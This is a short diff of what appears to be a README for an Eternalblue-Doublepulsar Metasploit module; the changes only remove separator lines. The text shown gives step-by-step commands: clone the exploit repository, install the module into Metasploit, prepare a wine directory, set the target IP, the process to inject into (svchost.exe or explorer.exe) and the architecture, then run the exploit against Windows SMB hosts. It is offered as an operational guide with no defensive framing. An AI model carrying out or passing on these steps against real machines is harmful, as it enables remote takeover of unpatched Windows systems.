@@ -6,7 +6,6 @@
 - git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
 - cd Eternalblue-Doublepulsar-Metasploit
 - cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
-
 * Note: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb
 - mkdir -p /root/.wine/drive_c/
 
@@ -20,7 +19,7 @@
 - show options
 
  * For Windows x64 
-- ================================================================================================
+
 -  RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or et PROCESSINJECT svchost.exe
  - set TARGETARCHITECTURE x64
@@ -31,7 +30,7 @@
  - run or exploit
  
  * For Windows x86
- - ================================================================================================
+
  - set RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or et PROCESSINJECT explorer.exe
  - set TARGETARCHITECTURE x86
